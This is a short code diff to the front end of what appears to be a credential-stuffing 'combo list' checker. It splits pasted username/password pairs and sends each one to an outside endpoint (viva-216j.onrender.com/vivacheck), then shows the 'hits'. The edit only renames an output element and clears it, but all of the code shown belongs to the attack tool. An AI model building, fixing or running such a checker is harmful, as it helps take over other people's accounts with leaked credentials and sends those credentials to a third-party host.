@@ -4,8 +4,8 @@ document.addEventListener('DOMContentLoaded', function () {
     checkBtn.addEventListener('click', async function () {
         const comboList = document.getElementById('comboList').value;
         const credentials = comboList.split('\n');
-        const hitsOutput = document.getElementById('hitsOutput');
-        // hitsOutput.innerHTML = '';
+        const hitsOutput = document.getElementById('hitsOutputs');
+        hitsOutput.innerHTML = '';
 
         try {
             const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
